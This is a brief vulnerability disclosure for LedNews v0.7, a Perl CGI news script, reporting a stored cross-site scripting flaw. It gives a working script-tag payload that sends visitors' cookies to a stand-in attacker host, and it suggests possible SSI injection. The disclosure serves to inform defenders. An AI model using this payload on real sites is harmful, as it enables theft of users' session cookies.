XSS Vulnerability in LedNews (CGI/Perl) v0.7

URL: http://www.ledscripts.com/index.php?page=free:perl:lednews

Description
=======

LedNews is a CGI application written entirely in perl. Its designed to be as 
simple as possible, but very powerful at the same thing.

Vulnerability
========

The script does not attempt to filter out javascript or any other HTML tags. 
So the posting message :

<script>
document.location.replace('http://evil-haxor.com/cgi-bin/cookiemonster.cgi?'+document.cookie);
</script>

as news will send cookies to your CGI script.

P.S.:
It may also be possible to put SSI tags in news posts, since the script does 
not seem to do the usual filtering for them. I did not test this because i'm 
to lazy to install SSI on my system.

About me
=======

I'm gilbert from Team UEC. I'm 16 years old.
I dream about a job in security someday.
This is my first time posting a vulnerability.
I can always be contacted at gilbert_vilvoorde@hotmail.com

Thank you for reading this and have a nice day,

Gilbert
